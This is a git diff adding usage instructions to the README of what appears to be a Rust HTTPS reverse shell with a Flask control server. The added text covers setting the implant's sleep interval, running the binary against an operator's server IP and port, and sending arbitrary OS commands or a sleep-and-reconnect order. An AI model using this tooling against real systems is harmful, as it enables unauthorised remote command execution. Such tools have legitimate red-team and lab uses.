@@ -48,6 +48,11 @@ cd /opt/RustHTTPSShell
 ```
 rustup target add x86_64-pc-windows-gnu
 ```
+6. If you want to change the sleep time in seconds, go into the .rs files and change the following parameters:
+```
+alarmClock::standBy(int)
+```
+Replace the "int" with whatever time you want. This will tell the shell to sleep for those seconds. Command explanation further below.
 
 Building from within container:
 -----
@@ -70,3 +75,18 @@ For both Windows and Linux version:
 .\binary.exe [Your_Server_IP] [Your_Server_port}
 ./binary [Your_Server_IP] [Your_Server_port}
 ```
+
+You should see a prompt in the flask server terminal. It expects the following options:
+```
+"Enter initialization option: "
+
+Enter "1" to begin typing arbitrary OS commands such as "dir" or "powershell Get-Service".
+Enter "2" to end the session and tell the shell to "sleep". After the time expires, the shell will attempt to reconnect to your server.
+```
+
+When entering "1" to get the command, you should see the following:
+```
+Enter command: 
+```
+
+You can also enter "2" in this "Enter command: " state that will sleep like explained above.
